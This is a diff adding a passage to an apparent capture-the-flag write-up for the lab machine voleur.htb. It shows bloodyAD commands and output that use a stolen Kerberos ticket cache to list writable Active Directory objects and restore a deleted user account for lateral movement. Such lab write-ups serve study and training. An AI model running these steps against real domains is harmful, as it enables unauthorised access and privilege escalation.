@@ -475,6 +475,43 @@ Mode                 LastWriteTime         Length Name
 ```
 
 ### Lateral Movement from svc_ldap to todd wolfe
+
+```
+bloodyAD --host DC.voleur.htb --dns 10.129.232.130 -d voleur.htb -k ccache=./svc_ldap.ccache get writable                      
+Clock skew detected. Adjusting local time by 8:00:51.084548. Retrying operation.
+
+distinguishedName: CN=S-1-5-11,CN=ForeignSecurityPrincipals,DC=voleur,DC=htb
+permission: WRITE
+
+distinguishedName: OU=Second-Line Support Technicians,DC=voleur,DC=htb
+permission: CREATE_CHILD; WRITE
+
+distinguishedName: CN=Lacey Miller,OU=Second-Line Support Technicians,DC=voleur,DC=htb
+permission: CREATE_CHILD; WRITE
+
+distinguishedName: CN=svc_ldap,OU=Service Accounts,DC=voleur,DC=htb
+permission: WRITE
+
+distinguishedName: CN=Todd Wolfe\0ADEL:1c6b1deb-c372-4cbb-87b1-15031de169db,CN=Deleted Objects,DC=voleur,DC=htb
+permission: CREATE_CHILD; WRITE
+
+distinguishedName: CN=svc_winrm,OU=Service Accounts,DC=voleur,DC=htb
+permission: WRITE
+
+distinguishedName: DC=voleur.htb,CN=MicrosoftDNS,DC=DomainDnsZones,DC=voleur,DC=htb
+permission: CREATE_CHILD
+
+distinguishedName: DC=_msdcs.voleur.htb,CN=MicrosoftDNS,DC=ForestDnsZones,DC=voleur,DC=htb
+permission: CREATE_CHILD
+
+```
+
+```
+bloodyAD -H DC.voleur.htb --dns 10.129.232.130 -d voleur.htb -k ccache=./svc_ldap.ccache \
+  set restore "CN=Todd Wolfe\0ADEL:1c6b1deb-c372-4cbb-87b1-15031de169db,CN=Deleted Objects,DC=voleur,DC=htb"
+Clock skew detected. Adjusting local time by 8:00:58.545705. Retrying operation.
+[+] CN=Todd Wolfe\0ADEL:1c6b1deb-c372-4cbb-87b1-15031de169db,CN=Deleted Objects,DC=voleur,DC=htb has been restored successfully under CN=Todd Wolfe,OU=Second-Line Support Technicians,DC=voleur,DC=htb
+```
 ---
 ## Privilege Escalation
 
